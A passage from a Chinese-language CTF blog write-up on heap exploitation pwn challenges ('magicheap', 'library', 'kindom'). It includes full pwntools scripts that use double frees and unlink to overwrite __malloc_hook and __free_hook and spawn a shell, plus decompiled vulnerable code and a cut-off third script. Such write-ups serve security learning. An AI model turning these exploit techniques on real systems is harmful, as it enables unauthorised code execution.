class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">command = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">ru(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">se(<span class="string">&#x27;8&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">ru(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">se(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">ru(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x78439</span></span><br><span class="line">log.info(<span class="string">&#x27;libc.address:&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">__malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;__malloc_hook:&#x27;</span>+<span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">one = libc.address+<span class="number">0xf02a4</span></span><br><span class="line">log.info(<span class="string">&#x27;one:&#x27;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x38</span>,p64(<span class="number">0x51</span>))</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;5&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x48</span>,p64(libc.address+<span class="number">0x3c4b30</span>))</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># z([&#x27;b *&#x27;+hex(proc_base+0xE88)])</span></span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="number">7</span>*p64(<span class="number">0</span>)+p64(__malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">context.binary = <span class="string">&#x27;./magicheap&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">exploit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> io.libs()</span><br><span class="line">proc_base = io.libs()[<span class="string">&#x27;/ctf/work/CTFPro/2019/ciscn2019-area/PWN/magicheap/magicheap&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">libc_base= io.libs()[<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="pwn6-library-✅"><a href="#pwn6-library-✅" class="headerlink" title="pwn6-library ✅"></a>pwn6-library ✅</h3><p>不解释</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=process([&#x27;./library-p1&#x27;],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.29.41.115&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">cipher</span>):</span><br><span class="line">      key=[<span class="number">61</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">167</span>, <span class="number">179</span>, <span class="number">193</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>, <span class="number">229</span>]</span><br><span class="line">      keyposs=[[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa3</span>):</span><br><span class="line">              ciphermid=cipher+(i&lt;&lt;<span class="number">32</span>)</span><br><span class="line">              <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                      <span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">                              <span class="keyword">if</span> ciphermid % k == <span class="number">0</span>:</span><br><span class="line">                                      ciphermid=ciphermid//k</span><br><span class="line">                                      <span class="keyword">break</span></span><br><span class="line">              <span class="keyword">if</span> ciphermid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>,<span class="number">263</span>):</span><br><span class="line">                      cipher=ciphermid</span><br><span class="line">                      <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">a,b</span>):</span><br><span class="line">  p.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">  p.readuntil(<span class="string">&#x27;the book:&#x27;</span>)</span><br><span class="line">  p.writeline(b)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">a</span>):</span><br><span class="line">  p.writeline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">  p.readuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">a,b</span>):</span><br><span class="line">  p.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">  p.readuntil(<span class="string">&#x27;new name of the book:&#x27;</span>)</span><br><span class="line">  p.writeline(b)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  cipher=p.recv()[:-<span class="number">1</span>]</span><br><span class="line">  cipher=<span class="built_in">int</span>(cipher,<span class="number">16</span>)</span><br><span class="line">  password=cal(cipher)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(password))</span><br><span class="line">p.readuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">new(<span class="number">1</span>,p64(<span class="number">0x31</span>)*<span class="number">3</span>+<span class="built_in">chr</span>(<span class="number">0x31</span>))</span><br><span class="line">new(<span class="number">2</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">new(<span class="number">4</span>,p64(<span class="number">0x31</span>)*<span class="number">3</span>)</span><br><span class="line">new(<span class="number">5</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">new(<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">new(<span class="number">7</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">p.writeline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">p.writeline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">heap=u64((p.readuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]).ljust(<span class="number">8</span>,<span class="built_in">chr</span>(<span class="number">0x0</span>)))-<span class="number">0x30</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap+<span class="number">0xa0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload=p64(<span class="number">0x90</span>)*<span class="number">3</span>+<span class="built_in">chr</span>(<span class="number">0x90</span>)</span><br><span class="line">  new(<span class="number">8</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  edit(<span class="number">4</span>,p64(<span class="number">0x31</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x20</span>))</span><br><span class="line">  </span><br><span class="line">  new(<span class="number">0</span>,payload)</span><br><span class="line">  </span><br><span class="line">  payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0x4040a8</span>-<span class="number">0x18</span>)+p32(<span class="number">0x4040a8</span>-<span class="number">0x10</span>)</span><br><span class="line">  new(<span class="number">9</span>,payload)</span><br><span class="line">  </span><br><span class="line">  dele(<span class="number">5</span>)</span><br><span class="line">  <span class="comment"># gdb.attach(p,&#x27;b *0x401513&#x27;)</span></span><br><span class="line">  edit(<span class="number">9</span>,p64(<span class="number">0x404040</span>)+p64(<span class="number">0x403f90</span>)+p64(<span class="number">0x404090</span>))</span><br><span class="line">  </span><br><span class="line">  edit(<span class="number">6</span>,p64(<span class="number">0xff</span>))</span><br><span class="line">  p.writeline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">  free_addr=u64((p.readuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]).ljust(<span class="number">8</span>,<span class="built_in">chr</span>(<span class="number">0x0</span>)))</span><br><span class="line">  free_hook=free_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">  system=(free_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]-libc.symbols[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">  edit(<span class="number">8</span>,p64(free_hook))</span><br><span class="line">  </span><br><span class="line">  edit(<span class="number">6</span>,p64(system))</span><br><span class="line">  </span><br><span class="line">  edit(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  p.writeline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  p.interactive()</span><br><span class="line">  p.close()</span><br></pre></td></tr></table></figure>

<h3 id="pwn7-kindom-❌"><a href="#pwn7-kindom-❌" class="headerlink" title="pwn7-kindom ❌"></a>pwn7-kindom ❌</h3><p>kindom 没做出来，主要原因是 没有去尝试，只是脑海里理论伪证了一遍…<br>漏洞是UAF，泄露一开始没想出来，但其实还是很简单的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">expel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Who has displeased you, master?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Tell me his index number:&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( servant[i] )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Ok, I&#x27;ll kill %s for you, monsieur.\n&quot;</span>, *(_QWORD *)servant[i]);</span><br><span class="line">            <span class="built_in">free</span>(servant[i]);                         <span class="comment">// double free</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;I don&#x27;t know him, monsieur.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为在分配时，都用的是calloc</p>
<p>所以泄露肯定不能分配后泄露，而是通过<code>free</code>间接来泄露，所以直接重用一个0x18的chunk，<code>free</code>之后就可以泄露堆地址了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !servant[j] )</span><br><span class="line">&#123;</span><br><span class="line">  servant[j] = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x10uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !servant[j] )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Calloc error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This is your NO.%d servent.\n&quot;</span>, j);</span><br><span class="line">  *((_DWORD *)servant[j] + <span class="number">2</span>) = <span class="number">10</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the name&#x27;s size of this servent:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;size);</span><br><span class="line">  v2 = (<span class="type">void</span> **)servant[j];</span><br><span class="line">  *v2 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)size);</span><br></pre></td></tr></table></figure>

<p>在attack函数中，出题人疯狂暗示，一个任意地址写0，另一个是<code>sacnf</code>函数，肯定是写stdin的<code>_IO_2_1_stdin_</code>中的<code>__IO_buf_base</code>劫持stdin结构体虚函数表的套路</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">attack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"><span class="type">size_t</span> n; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"><span class="type">void</span> *s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"><span class="type">void</span> *ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( flag == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to use excalibur?&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="string">&#x27;y&#x27;</span> || buf == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Where do you want to wipe out?&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How much power do you want to use?(0-8)&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)n &gt; <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The max power is 8.&quot;</span>);</span><br><span class="line">      <span class="built_in">LODWORD</span>(n) = <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;EX-calibur!!!\n\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, (<span class="type">unsigned</span> <span class="type">int</span>)n);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( <span class="built_in">HIDWORD</span>(n) = <span class="number">0</span>; <span class="built_in">SHIDWORD</span>(n) &lt;= <span class="number">9</span>; ++<span class="built_in">HIDWORD</span>(n) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( servant[<span class="built_in">SHIDWORD</span>(n)] )</span><br><span class="line">    *(_DWORD *)&amp;monster -= *((_DWORD *)servant[<span class="built_in">SHIDWORD</span>(n)] + <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_DWORD *)&amp;monster &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You have won, master.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave your name please:&quot;</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x200uLL</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%512s&quot;</span>, ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Master, the world will remember you.&quot;</span>);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;......&quot;</span>);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just kidding, no one will remember you.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是，通过overlap泄露地址，之后劫持stdin之后，修改<code>__free_hook</code> 来getshell即可<br>注意在Getshell的位置:<br>直接利用stdin的<code>_IO_write_base</code>等指针写<code>__free_hook</code>还是第一次见，威力很大</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"><span 